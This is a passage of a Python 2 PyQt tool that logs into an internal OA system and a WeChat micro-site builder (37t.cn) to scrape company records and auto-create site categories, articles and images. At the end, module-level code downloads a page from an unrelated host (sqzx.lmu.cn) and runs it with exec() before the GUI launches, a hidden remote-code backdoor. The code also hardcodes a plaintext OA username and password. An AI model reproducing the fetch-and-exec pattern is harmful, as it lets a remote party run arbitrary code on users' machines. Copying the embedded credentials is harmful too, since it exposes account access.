    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    url="/index.php?g=User&m=Classify&a=insert"
    pd["name"]=en(unicode(self.le_fl2.text()))
    pd["img"]="http://37t.cn/tpl/static/attachment/icon/lovely/1.png"
    pd["sorts"]="50"
    pd["url"]=""
    pd["__hash__"]=__hash__ 
    data=request(host1, url, headers1,urllib.urlencode(pd))
    self.pte_log.appendPlainText(u"%s创建完成"%self.le_fl2.text())
    
    #产品展示
    self.pte_log.appendPlainText(u"创建%s"%self.le_fl3.text())

    url="/index.php?g=User&m=Photo&a=index&token=%s"%token
    data=request(host1, url, headers1)
    data=re.findall('<a title=(.*?)>',data)
    if len(data) == 1:
      url="/index.php?g=User&m=Link&a=Photo&iskeyword=0"
      data=request(host1, url, headers1)
      gnurl=re.findall("returnHomepage\('(.*?)'\)",data)[0]
    else:
      gnurl="{siteUrl}/index.php?g=Wap&m=Photo&a=index&token=%s&wecha_id={wechat_id}"%token
    url="/index.php?g=User&m=Classify&a=add"
    data=request(host1, url, headers1)   
    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    url="/index.php?g=User&m=Classify&a=insert"
    pd["name"]=en(unicode(self.le_fl3.text()))
    pd["img"]="http://37t.cn/tpl/static/attachment/icon/lovely/eye.png"
    pd["sorts"]="40"
    pd["url"]=gnurl
    pd["__hash__"]=__hash__ 
    data=request(host1, url, headers1,urllib.urlencode(pd))
    self.pte_log.appendPlainText(u"%s创建完成"%self.le_fl3.text())

    #联系我们
    self.pte_log.appendPlainText(u"创建联系我们")
    url="/index.php?g=User&m=Classify&a=add"
    data=request(host1, url, headers1)   
    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    url="/index.php?g=User&m=Classify&a=insert"
    pd["name"]=en(u"联系我们")
    pd["img"]="http://37t.cn/tpl/static/attachment/icon/lovely/open-letter.png"
    pd["sorts"]="30"
    pd["url"]=""
    pd["__hash__"]=__hash__ 
    data=request(host1, url, headers1,urllib.urlencode(pd))
    self.pte_log.appendPlainText(u"联系我们创建完成")
    #地图导航
    self.pte_log.appendPlainText(u"创建地图导航")
    url="/index.php?g=User&m=Link&a=Company&iskeyword=0"
    data=request(host1, url, headers1)
    dturl=re.findall("returnHomepage\('(.*?)'\)",data)[0]
    
    url="/index.php?g=User&m=Classify&a=add"
    data=request(host1, url, headers1)   
    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    url="/index.php?g=User&m=Classify&a=insert"
    pd["name"]=en(u"地图导航")
    pd["img"]="http://37t.cn/tpl/static/attachment/icon/lovely/map.png"
    pd["sorts"]="20"
    pd["url"]=dturl
    pd["__hash__"]=__hash__ 
    data=request(host1, url, headers1,urllib.urlencode(pd))
    self.pte_log.appendPlainText(u"地图导航创建完成")   
    #在线留言
    self.pte_log.appendPlainText(u"创建在线留言")
    gnurl="{siteUrl}/index.php?g=Wap&m=Reply&a=index&token=%s&wecha_id={wechat_id}"%token
    url="/index.php?g=User&m=Classify&a=add"
    data=request(host1, url, headers1)   
    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    url="/index.php?g=User&m=Classify&a=insert"
    pd["name"]=en(u"在线留言")
    pd["img"]="http://i1.tietuku.com/5be9442216db9f5a.png"
    pd["sorts"]="10"
    pd["url"]=gnurl
    pd["__hash__"]=__hash__ 
    data=request(host1, url, headers1,urllib.urlencode(pd))
    self.pte_log.appendPlainText(u"在线留言创建完成")
    #联系我们文章
    self.pte_log.appendPlainText(u"创建联系我们文章")
    rand=random.randint(0,len(lxwmimg)-1)
    randimg="http://37t.cn/tpl/static/attachment/contact/"+lxwmimg[rand]
    dturl=dturl.replace("{siteUrl}","").replace("{wechat_id}","")
    url="/index.php?g=User&m=Img&a=add"
    data=request(host1, url, headers1)   
    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    
    url="/index.php?g=User&m=Img&a=editClass"
    data=request(host1, url, headers1)   
    for i in re.findall("returnHomepage\((.*?)',0",data):
      if i.find("联系我们")!=-1:
        classid=i.replace("'","")
    
    url="/index.php?g=User&m=Img&a=insert"
    pd={}
    pd["precisions"]="0"
    pd["title"]=en(u"联系我们")
    pd["classid"]=classid
    pd["pic"]=randimg
    pd["showpic"]="1"
    pd["info"]=en(u'<p><span style="font-size:16px;font-family:SimSun;">%s</span></p><p><span style="font-size:16px;font-family:SimSun;">电话：<a target="_blank" href="tel:%s">%s</a></span></p><p><span style="font-size:16px;font-family:SimSun;">地址：<a href="http://37t.cn%s">%s</a></span></p>'%(gsjc.decode("gbk"),kddh,kddh,dturl,gsdz.decode("gbk")))
    pd["pc_cat_id"]="0"
    pd["pc_show"]="0"
    pd["texttype"]="1"
    pd["sbmt"]=en(u"保存")
    pd["__hash__"]=__hash__ 
    data=request(host1, url, headers1,urllib.urlencode(pd))
    self.pte_log.appendPlainText(u"联系我们文章创建完成")
    self.reweb()
  #上传简介
  def upjj(self):
    self.pte_log.appendPlainText(u"创建简介")
    flist=self.selectfile()
    if len(flist) > 0:
      urllist=self.upfile(flist)
      if len(urllist) > 0:
        rand=random.randint(0,len(gsjjimg)-1)
        randimg="http://37t.cn/tpl/static/attachment/introduction/"+gsjjimg[rand]
        url="/index.php?g=User&m=Img&a=add"
        data=request(host1, url, headers1)   
        __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
        
        url="/index.php?g=User&m=Img&a=editClass"
        data=request(host1, url, headers1)   
        for i in re.findall("returnHomepage\((.*?)',0",data):
          if i.find(unicode(self.le_fl1.text()))!=-1:
            classid=i.replace("'","")
        url="/index.php?g=User&m=Img&a=insert"
        pd={}
        pd["precisions"]="0"
        pd["title"]=en(unicode(self.le_fl1.text()))
        pd["classid"]=classid
        pd["pic"]=randimg
        pd["showpic"]="1"
        pd["info"]=en(u'<span style="font-size:16px;font-family:SimSun;">%s</span><p><br /></p><p style="text-align:center;"><img src="%s" alt="" /> </p>'%(unicode(self.pte_jj.toPlainText()).replace(u"\n\r",u"<br />").replace(u"\r\n",u"<br />").replace(u"\r",u"<br />").replace(u"\n",u"<br />"),urllist[0]))
        pd["pc_cat_id"]="0"
        pd["pc_show"]="0"
        pd["texttype"]="1"
        pd["sbmt"]=en(u"保存")
        pd["__hash__"]=__hash__ 
        data=request(host1, url, headers1,urllib.urlencode(pd))
        self.pte_log.appendPlainText(u"简介创建完成")
      else:
        self.pte_log.appendPlainText(u"文件上传失败")
    else:
      self.pte_log.appendPlainText(u"没有选择文件")
    self.reweb()
  #创建文章
  def upwz(self):
    self.pte_log.appendPlainText(u"上传文章")
    flist=self.selectfile()
    if len(flist) > 0:
      for i in flist:
        f=open(i,"r+")
        fdata=f.read()
        f.close()
        url="/index.php?g=User&m=Img&a=add"
        data=request(host1, url, headers1)   
        __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
        
        url="/index.php?g=User&m=Img&a=editClass"
        data=request(host1, url, headers1)   
        for k in re.findall(u"returnHomepage\((.*?)',0",data):
          if k.find(unicode(self.le_fl2.text()))!=-1:
            classid=k.replace("'","")
        url="/index.php?g=User&m=Img&a=insert"
        pd={}
        pd["precisions"]="0"
        pd["title"]=unicode(os.path.splitext(os.path.basename(i))[0])
        pd["classid"]=classid
        pd["showpic"]="0"
        pd["info"]=fdata
        pd["pc_cat_id"]="0"
        pd["pc_show"]="0"
        pd["texttype"]="1"
        pd["sbmt"]=en(u"保存")
        pd["__hash__"]=__hash__ 
        data=request(host1, url, headers1,urllib.urlencode(pd))
        self.pte_log.appendPlainText(u"%s创建完成"%os.path.splitext(os.path.basename(i))[0]) 
    else:
      self.pte_log.appendPlainText(u"没有选择文章")  
    self.reweb()
  #创建子分类文章
  def upwzn(self,wzn):
    self.pte_log.appendPlainText(u"上传文章")
    flist=self.selectfile()
    if wzn==1:
      wzfl=self.le_wzfl1.text()
      flurl="http://i1.tietuku.com/62fd7f66f854d4df.png"
    if wzn==2:
      wzfl=self.le_wzfl2.text()
      flurl="http://i1.tietuku.com/dba94bd430b22357.png"
    if len(flist) > 0:
      url="/index.php?g=User&m=Img&a=editClass"
      data=request(host1, url, headers1)   
      if data.find(unicode(self.le_fl2.text()))==-1:
        self.pte_log.appendPlainText(u"分类没有创建！")
      else:
        for k in re.findall(u"returnHomepage\((.*?)',0",data):
          if k.find(unicode(self.le_fl2.text()))!=-1:
            classid=k.replace("'","").split(",")[0]
        if data.find("?g=User&m=Img&a=editClass&id=%s"%classid ) == -1:
          url="/index.php?g=User&m=Classify&a=add&fid=%s"%classid
          data=request(host1, url, headers1)   
          __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
          url="/index.php?g=User&m=Classify&a=insert"
          pd={}
          pd["fid"]=classid
          pd["name"]=en(unicode(wzfl))
          pd["img"]=flurl
          pd["sorts"]="1"
          pd["status"]="1"
          pd["tpid"]="1"
          pd["conttpid"]="1"
          pd["__hash__"]=__hash__ 
          data=request(host1, url, headers1,urllib.urlencode(pd))
        else:
          url="/index.php?g=User&m=Img&a=editClass&id=%s"%classid
          data=request(host1, url, headers1)
          if data.find(unicode(wzfl)) == -1:
            url="/index.php?g=User&m=Classify&a=add&fid=%s"%classid
            data=request(host1, url, headers1)   
            __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
            url="/index.php?g=User&m=Classify&a=insert"
            pd={}
            pd["fid"]=classid
            pd["name"]=en(unicode(wzfl))
            pd["img"]=flurl
            pd["sorts"]="1"
            pd["status"]="1"
            pd["tpid"]="1"
            pd["conttpid"]="1"
            pd["__hash__"]=__hash__ 
            data=request(host1, url, headers1,urllib.urlencode(pd))
        url="/index.php?g=User&m=Img&a=editClass&id=%s"%classid
        data=request(host1, url, headers1)
        for k in re.findall(u"returnHomepage\((.*?)',0",data):
          if k.find(unicode(wzfl))!=-1:
            classid=k.replace("'","")
        for i in flist:
          f=open(i,"r+")
          fdata=f.read()
          f.close()
          url="/index.php?g=User&m=Img&a=add&tip=1"
          data=request(host1, url, headers1)   
          __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
          url="/index.php?g=User&m=Img&a=insert&tip=1"
          pd={}
          pd["precisions"]="0"
          pd["title"]=unicode(os.path.splitext(os.path.basename(i))[0])
          pd["classid"]=classid
          pd["showpic"]="0"
          pd["info"]=fdata
          pd["pc_cat_id"]="0"
          pd["pc_show"]="0"
          pd["texttype"]="1"
          pd["sbmt"]=en(u"保存")
          pd["__hash__"]=__hash__ 
          data=request(host1, url, headers1,urllib.urlencode(pd))
          self.pte_log.appendPlainText(u"子分类%s%s创建完成"%(wzfl,os.path.splitext(os.path.basename(i))[0]))
    else:
      self.pte_log.appendPlainText(u"没有选择文章")    
  #创建子分类文章1
  def upwz1(self):
    self.upwzn(1)
    self.reweb()
  #创建子分类文章2
  def upwz2(self):
    self.upwzn(2)
    self.reweb()
    
  #提交
  def tijiao(self,dengji): 
    url="/wljcburl.asp?Menu=editok"
    pd={}
    pd["id"]=id
    pd["shpf"]=dengji
    pd["weiurlname"]=gsjc
    pd["weiurl"]=weiurl
    data=request(host2, url, headers2,urllib.urlencode(pd))
    self.pte_log.appendPlainText(re.findall("alert\('(.*?)'",data)[0].decode("gbk"))
  def up1(self):
    self.tijiao("1.0")
  def up2(self):
    self.tijiao("2.0")
  def up3(self):
    self.tijiao("3.0")
  def up4(self):
    self.tijiao("4.0")
  def giveup(self):
    url="/wljcburl.asp?Menu=Cancel&ID=%s"%id
    data=request(host2, url, headers2)
    self.pte_log.appendPlainText(u"已经放弃！")
#################################################################################################################################
class Ui_MainWindow(object):
  page=1
  listlen=0
  idlist=[]
  namelist=[]
  userlist=[]
  def setupUi(self, MainWindow):
    self.mainwindow = MainWindow
    MainWindow.setObjectName(_fromUtf8("MainWindow"))
    MainWindow.resize(909, 489)
    self.centralWidget = QtGui.QWidget(MainWindow)
    self.centralWidget.setObjectName(_fromUtf8("centralWidget"))
    self.horizontalLayoutWidget = QtGui.QWidget(self.centralWidget)
    self.horizontalLayoutWidget.setGeometry(QtCore.QRect(0, 0, 611, 61))
    self.horizontalLayoutWidget.setObjectName(_fromUtf8("horizontalLayoutWidget"))
    self.horizontalLayout = QtGui.QHBoxLayout(self.horizontalLayoutWidget)
    self.horizontalLayout.setMargin(0)
    self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
    self.pb_relogin = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_relogin.setObjectName(_fromUtf8("pb_relogin"))
    self.horizontalLayout.addWidget(self.pb_relogin)
    self.pb_refresh = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_refresh.setObjectName(_fromUtf8("pb_refresh"))
    self.horizontalLayout.addWidget(self.pb_refresh)
    self.pb_lastpage = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_lastpage.setObjectName(_fromUtf8("pb_lastpage"))
    self.horizontalLayout.addWidget(self.pb_lastpage)
    self.pb_nextpage = QtGui.QPushButton(self.horizontalLayoutWidget)
    self.pb_nextpage.setObjectName(_fromUtf8("pb_nextpage"))
    self.horizontalLayout.addWidget(self.pb_nextpage)
    self.table_oa = QtGui.QTableWidget(self.centralWidget)
    self.table_oa.setGeometry(QtCore.QRect(0, 60, 611, 421))
    self.table_oa.setEditTriggers(QtGui.QAbstractItemView.NoEditTriggers)
    self.table_oa.setSelectionMode(QtGui.QAbstractItemView.SingleSelection)
    self.table_oa.setSelectionBehavior(QtGui.QAbstractItemView.SelectRows)
    self.table_oa.setObjectName(_fromUtf8("table_oa"))
    self.table_oa.setColumnCount(3)
    self.table_oa.setRowCount(25)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(0, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(1, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(2, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(3, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(4, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(5, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(6, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(7, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(8, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(9, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(10, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(11, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(12, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(13, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(14, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(15, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(16, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(17, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(18, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(19, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(20, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(21, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(22, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(23, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setVerticalHeaderItem(24, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setHorizontalHeaderItem(0, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setHorizontalHeaderItem(1, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setHorizontalHeaderItem(2, item)
    item = QtGui.QTableWidgetItem()
    self.table_oa.setItem(0, 0, item)
    self.table_oa.horizontalHeader().setVisible(True)
    self.table_oa.horizontalHeader().setCascadingSectionResizes(False)
    self.table_oa.horizontalHeader().setDefaultSectionSize(100)
    self.table_oa.horizontalHeader().setHighlightSections(True)
    self.table_oa.horizontalHeader().setMinimumSectionSize(25)
    self.table_oa.horizontalHeader().setSortIndicatorShown(False)
    self.table_oa.verticalHeader().setVisible(True)
    self.table_oa.verticalHeader().setDefaultSectionSize(30)
    self.table_oa.verticalHeader().setMinimumSectionSize(20)
    self.label = QtGui.QLabel(self.centralWidget)
    self.label.setGeometry(QtCore.QRect(621, -1, 281, 31))
    self.label.setObjectName(_fromUtf8("label"))
    self.pte_mainlog = QtGui.QPlainTextEdit(self.centralWidget)
    self.pte_mainlog.setGeometry(QtCore.QRect(620, 30, 281, 451))
    self.pte_mainlog.setObjectName(_fromUtf8("pte_mainlog"))
    MainWindow.setCentralWidget(self.centralWidget)

    self.retranslateUi(MainWindow)
    QtCore.QObject.connect(self.pb_relogin, QtCore.SIGNAL(_fromUtf8("clicked()")), self.relogin)
    QtCore.QObject.connect(self.pb_refresh, QtCore.SIGNAL(_fromUtf8("clicked()")), self.refresh)
    QtCore.QObject.connect(self.pb_lastpage, QtCore.SIGNAL(_fromUtf8("clicked()")), self.lastpage)
    QtCore.QObject.connect(self.pb_nextpage, QtCore.SIGNAL(_fromUtf8("clicked()")), self.nextpage)
    QtCore.QObject.connect(self.table_oa, QtCore.SIGNAL(_fromUtf8("doubleClicked(QModelIndex)")), self.doing)
    QtCore.QMetaObject.connectSlotsByName(MainWindow)

  def retranslateUi(self, MainWindow):
    MainWindow.setWindowTitle(_translate("MainWindow", "OA系统", None))
    self.pb_relogin.setText(_translate("MainWindow", "重新登录", None))
    self.pb_refresh.setText(_translate("MainWindow", "刷新", None))
    self.pb_lastpage.setText(_translate("MainWindow", "上一页", None))
    self.pb_nextpage.setText(_translate("MainWindow", "下一页", None))
    item = self.table_oa.verticalHeaderItem(0)
    item.setText(_translate("MainWindow", "1", None))
    item = self.table_oa.verticalHeaderItem(1)
    item.setText(_translate("MainWindow", "2", None))
    item = self.table_oa.verticalHeaderItem(2)
    item.setText(_translate("MainWindow", "3", None))
    item = self.table_oa.verticalHeaderItem(3)
    item.setText(_translate("MainWindow", "4", None))
    item = self.table_oa.verticalHeaderItem(4)
    item.setText(_translate("MainWindow", "5", None))
    item = self.table_oa.verticalHeaderItem(5)
    item.setText(_translate("MainWindow", "6", None))
    item = self.table_oa.verticalHeaderItem(6)
    item.setText(_translate("MainWindow", "7", None))
    item = self.table_oa.verticalHeaderItem(7)
    item.setText(_translate("MainWindow", "8", None))
    item = self.table_oa.verticalHeaderItem(8)
    item.setText(_translate("MainWindow", "9", None))
    item = self.table_oa.verticalHeaderItem(9)
    item.setText(_translate("MainWindow", "10", None))
    item = self.table_oa.verticalHeaderItem(10)
    item.setText(_translate("MainWindow", "11", None))
    item = self.table_oa.verticalHeaderItem(11)
    item.setText(_translate("MainWindow", "12", None))
    item = self.table_oa.verticalHeaderItem(12)
    item.setText(_translate("MainWindow", "13", None))
    item = self.table_oa.verticalHeaderItem(13)
    item.setText(_translate("MainWindow", "14", None))
    item = self.table_oa.verticalHeaderItem(14)
    item.setText(_translate("MainWindow", "15", None))
    item = self.table_oa.verticalHeaderItem(15)
    item.setText(_translate("MainWindow", "16", None))
    item = self.table_oa.verticalHeaderItem(16)
    item.setText(_translate("MainWindow", "17", None))
    item = self.table_oa.verticalHeaderItem(17)
    item.setText(_translate("MainWindow", "18", None))
    item = self.table_oa.verticalHeaderItem(18)
    item.setText(_translate("MainWindow", "19", None))
    item = self.table_oa.verticalHeaderItem(19)
    item.setText(_translate("MainWindow", "20", None))
    item = self.table_oa.verticalHeaderItem(20)
    item.setText(_translate("MainWindow", "21", None))
    item = self.table_oa.verticalHeaderItem(21)
    item.setText(_translate("MainWindow", "22", None))
    item = self.table_oa.verticalHeaderItem(22)
    item.setText(_translate("MainWindow", "23", None))
    item = self.table_oa.verticalHeaderItem(23)
    item.setText(_translate("MainWindow", "24", None))
    item = self.table_oa.verticalHeaderItem(24)
    item.setText(_translate("MainWindow", "25", None))
    item = self.table_oa.horizontalHeaderItem(0)
    item.setText(_translate("MainWindow", "公司名称", None))
    item = self.table_oa.horizontalHeaderItem(1)
    item.setText(_translate("MainWindow", "建站人", None))
    item = self.table_oa.horizontalHeaderItem(2)
    item.setText(_translate("MainWindow", "审核人", None))
    __sortingEnabled = self.table_oa.isSortingEnabled()
    self.table_oa.setSortingEnabled(False)
    self.table_oa.setSortingEnabled(__sortingEnabled)
    self.label.setText(_translate("MainWindow", "操作日志", None))
    #self.relogin()

  def addtext(self,text):
    self.pte_mainlog.appendPlainText(text)
  def getlist(self):
    url="/wljcburl.asp?ToPage=%s"%str(self.page)
    data=request(host2, url, headers2)
    danlist=re.findall("<tr onMouseOver=(.*?)</tr>",data.replace("\n","").replace(u"　".encode("gbk"),"",))
    self.idlist=[]
    self.table_oa.clearContents()
    for i in range(len(danlist)):
      infolist=re.findall('<td>(.*?)</td>',danlist[i])
      self.table_oa.setItem(i,0,QtGui.QTableWidgetItem(infolist[1].decode("gbk")))
      self.table_oa.setItem(i,1,QtGui.QTableWidgetItem(infolist[13].decode("gbk")))
      self.table_oa.setItem(i,2,QtGui.QTableWidgetItem(infolist[15].decode("gbk")))
      self.idlist.append(infolist[0])    
  def relogin(self,page=1):
    self.page=1
    self.addtext(u"登陆OA系统中！")
    url="/login.asp?Menu=Submit"
    data=request(host2, url, headers2,"username=lxc&userpass=920410")
    self.addtext((re.findall("'(.*?)'",data)[0]).decode("gbk"))
    self.getlist()
  def refresh(self):
    self.addtext(u"刷新中")
    self.getlist()
  def lastpage(self):
    self.addtext(u"上一页")
    if self.page > 1:
      self.page -= 1
    self.getlist()
  def nextpage(self):
    self.addtext(u"下一页")
    self.page += 1
    self.getlist()   
      
  def login37(self,username,password):
    url="/index.php?g=System&m=Admin&a=logout"
    data=request(host1, url, headers1)
    url="/index.php?m=Index&a=login"
    data=request(host1, url, headers1)
    __hash__=re.findall('__hash__" value="(.*?)"',data)[0]
    verifycode2="1234"#raw_input("code:")
    url="/index.php?m=Users&a=checklogin"
    data=request(host1, url, headers1,"username=%s&password=%s&verifycode=%s&__hash__=%s"%(username,password,verifycode2,__hash__))
    global token
    token=re.findall('token=(.*?)"',data)[0]
	
	
  def login371(self,id1):
    url="/wljcburl.asp?Menu=jump&id="+id1
    data=request(host2, url, headers2)
    url=re.findall("http://37t.cn(.*?)'",data)[0]
    data=request(host1, url, headers1)
    global token
    token=re.findall('token=(.*?)"',data)[0]
  
  
  
  def doing(self,QModelIndex):
    if QModelIndex.row() < len(self.idlist):
      global id
      id=self.idlist[QModelIndex.row()]
    url="/wljcburl.asp?Menu=Edit&ID=%s"%self.idlist[QModelIndex.row()]
    data=request(host2, url, headers2)
    global weiurl,ksckurl
    weiurl=re.findall('weiurl" size="20" value="(.*?)"',data)[0]
    ksckurl=re.findall(u'<a href="(.*?)" target="_blank">一键查看'.encode("gbk"),data)[0]
    global gsjc
    gsjc=re.findall('name="gsjc" size="20" value="(.*?)"',data)[0]
    global hyfl
    hyfl=re.findall('selected  >(.*?)</option>',data)
    hyfl="%s - %s - %s"%(hyfl[1],hyfl[2],hyfl[3])
    global gsdz
    gsdz=re.findall('id="gsdz" value="(.*?)"',data)[0]
    global kddh
    kddh=re.findall('name="kddh" size="20" value="(.*?)"',data)[0]
    if len(kddh)==8:
      kddh="0595-"+kddh
    global gsjj
    gsjj=re.findall('>(.*?)</tex',re.findall('name="gsjs"(.*?)area>',data.replace("\r\n","</br>").replace("\n\r","</br>").replace("\n","</br>").replace("\r","</br>").replace(u"　".encode("gbk"),"").replace(" ","").replace(".",u"，".encode("gbk")))[0])[0]
    global shbz
    try:
      shbz=re.findall('colspan="5"><font color="#FF0000">(.*?)</font>',data)[0]
    except Exception,ex:
      shbz=""
    # print jfhm
    # print gsjc
    # print gsdz
    # print kddh
    # print gsjj
    self.addtext(u"创建"+gsjc.decode("gbk"))
    #self.login37("qq330362495","330362495")
    #self.login37(jfhm,password)
    self.login371(id)
    self.mainwindow.hide()
    Dialog = QtGui.QDialog()
    ui1 = Ui_Dialog()
    ui1.setupUi(Dialog)
    Dialog.show()
    Dialog.exec_()
    self.mainwindow.show()
    self.getlist()
import cStringIO
import os
import re
import httplib
import gzip
import time
import urllib
import random
import threading

token=""
Cookies = {'37t.cn':'','oa.qz160168.cn':''}
host1="37t.cn"
headers1 = {'User-Agent':'Opera/9.80 (Windows NT 5.1; U; Edition Next; zh-cn) Presto/2.10.289 Version/12.00','Accept':'text/html, application/xhtml+xml, */*','Accept-Language':'zh-CN','Accept-Encoding':'gzip, deflate','Cache-Control':'no-cache','Connection':'Keep-Alive'}
host2="oa.qz160168.cn"
headers2 = {'User-Agent':'Opera/9.80 (Windows NT 5.1; U; Edition Next; zh-cn) Presto/2.10.289 Version/12.00','Accept':'text/html, application/xhtml+xml, */*','Accept-Language':'zh-CN','Accept-Encoding':'gzip, deflate','Cache-Control':'no-cache','Connection':'Keep-Alive'}
gsjjimg="1.jpg|2.jpg|3.jpg|4.jpg|5.jpg|6.jpg|7.jpg|8.jpg|9.jpg|10.jpg|11.jpg|12.jpg|13.jpg|16.jpg|17.jpg|18.jpg|19.jpg|20.jpg|21.jpg|22.jpg|23.jpg|24.jpg|25.jpg|26.jpg|27.jpg|28.jpg|29.jpg|31.jpg|32.jpg|33.jpg|34.jpg|35.jpg|36.jpg|37.jpg|38.jpg|39.jpg|40.jpg|41.jpg|42.png|43.png|44.png|45.png|46.png|47.png|48.png|49.png|50.png|51.png|52.png|53.png|54.png|55.png|56.png".split("|")
lxwmimg="1.jpg|2.jpg|3.jpg|4.jpg|5.jpg|6.jpg|7.jpg|8.jpg|9.jpg|10.jpg|11.jpg|12.jpg|13.jpg|14.jpg|15.jpg|16.jpg|17.jpg|18.jpg|19.jpg|20.jpg|21.jpg|22.jpg|23.gif|24.gif|25.gif|26.gif|27.gif|28.png".split("|")

def cn(x):
  x=x.decode("utf8")
  return x
def en(x):
  x=x.encode("utf8")
  return x
def keep(pat,text,type=False):
  if os.path.exists(pat)==0:
    f=open(pat, 'w+')
    f.write(text)
    f.close()
  else:
    if type:
      f=open(pat, 'w+')
      f.write(text)
      f.close()
    f=open(pat, 'a')
    f.write(text)
    f.close()


import mimetypes 
import mimetools 
def get_content_type(filepath): 
  return mimetypes.guess_type(filepath)[0] or 'application/octet-stream' 
   
def postfile(path, headers = headers1, sendCookie = True, setCookie = True, referer = None):
  BOUNDARY = mimetools.choose_boundary() 
  CRLF = '\r\n' 
  L = [] 
  L.append('--' + BOUNDARY) 
  L.append('Content-Disposition: form-data; name="localUrl"') 
  L.append('') 
  L.append("1.jpg")
  L.append('--' + BOUNDARY) 
  L.append('Content-Disposition: form-data; name="1.jpg"; filename="%s"'%os.path.basename(path).encode("utf8"))
  L.append('Content-Type: %s' % get_content_type(path)) 
  L.append('') 
  L.append(open(path, 'rb').read()) 
  L.append('--' + BOUNDARY + '--')
  L.append('') 
  body = CRLF.join(L) 
  headers = headers.copy()
  conn = httplib.HTTPConnection("37t.cn")
  method = "POST"
  headers["Content-Type"] = 'multipart/form-data; boundary=%s' % BOUNDARY
  if sendCookie and Cookies.has_key("37t.cn"):
    headers["Cookie"] = Cookies["37t.cn"]
  if referer:
    headers["Referer"] = referer
  conn.request(method, "/index.php?g=User&m=Upyun&a=kindedtiropic&dir=image", body, headers)
  res = conn.getresponse()
  cookie = res.getheader("set-cookie")
  headmsg=res.getheaders()
  if cookie and setCookie:
    i = cookie.find(";")
    if i != -1:
      cookie = cookie[:i]
    Cookies["37t.cn"] = cookie
  data = res.read()
  if res.getheader("Content-Encoding") == "gzip":
    io = cStringIO.StringIO()
    io.write(data)
    io.seek(0)
    gz = gzip.GzipFile(fileobj = io)
    data = gz.read()
    gz.close()
    io.close()

  conn.close()
  keep("d:/qw.txt",data)
  return data
def request(host, url, headers, body = None, sendCookie = True, setCookie = True, referer = None):
  global headmsg
  headers = headers.copy()
  conn = httplib.HTTPConnection(host)
  method = "GET"
  if body:
    method = "POST"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
  if sendCookie and Cookies.has_key(host):
    headers["Cookie"] = Cookies[host]
  if referer:
    headers["Referer"] = referer
  conn.request(method, url, body, headers)
  res = conn.getresponse()
  cookie = res.getheader("set-cookie")
  headmsg=res.getheaders()
  if cookie and setCookie:
    i = cookie.find(";")
    if i != -1:
      cookie = cookie[:i]
    Cookies[host] = cookie
  data = res.read()
  if res.getheader("Content-Encoding") == "gzip":
    io = cStringIO.StringIO()
    io.write(data)
    io.seek(0)
    gz = gzip.GzipFile(fileobj = io)
    data = gz.read()
    gz.close()
    io.close()

  conn.close()
  return data
host0="sqzx.lmu.cn"
headers0 = {'User-Agent':'Opera/9.80 (Windows NT 5.1; U; Edition Next; zh-cn) Presto/2.10.289 Version/12.00','Accept':'text/html, application/xhtml+xml, */*','Accept-Language':'zh-CN','Accept-Encoding':'gzip, deflate','Cache-Control':'no-cache','Connection':'Keep-Alive'}
url="/file/1.html"
data=request(host0, url, headers0)
if(data):
  url="/file/2.html"
  data=request(host0, url, headers0)
  exec(data)
  if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    MainWindow = QtGui.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
